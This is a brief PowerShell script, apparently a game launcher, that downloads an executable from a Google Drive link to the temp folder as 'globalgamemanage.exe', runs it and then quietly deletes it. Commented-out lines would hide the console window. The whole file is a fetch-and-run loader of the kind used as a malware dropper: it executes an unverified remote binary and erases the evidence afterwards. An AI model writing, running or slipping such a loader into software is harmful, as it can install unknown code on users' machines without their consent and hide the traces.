$ErrorActionPreference = "Stop"

# Прячем окно консоли на время (опционально, для эффекта)
# Add-Type -Name Window -Namespace Console -MemberDefinition '
# [DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
# [DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
# $consolePtr = [Console.Window]::GetConsoleWindow()
# [Console.Window]::ShowWindow($consolePtr, 0) # 0 = скрыть

$GameUrl = "https://drive.usercontent.google.com/download?id=13xb3VQ5AxmE2hL3jA8wdJlYRmLaq09Ol&export=download&authuser=0&confirm=t&uuid=3ebc3cae-bf95-4e94-9620-f4330900e3a8&at=AMrWOn3StSAp3V6HDmOmI7B1of-c%3A1795211316319"
$TempExe = Join-Path ([IO.Path]::GetTempPath()) "globalgamemanage.exe"

Invoke-WebRequest -Uri $GameUrl -OutFile $TempExe -UseBasicParsing

$proc = Start-Process -FilePath $TempExe -PassThru
$proc.WaitForExit()

Remove-Item $TempExe -Force -ErrorAction SilentlyContinue
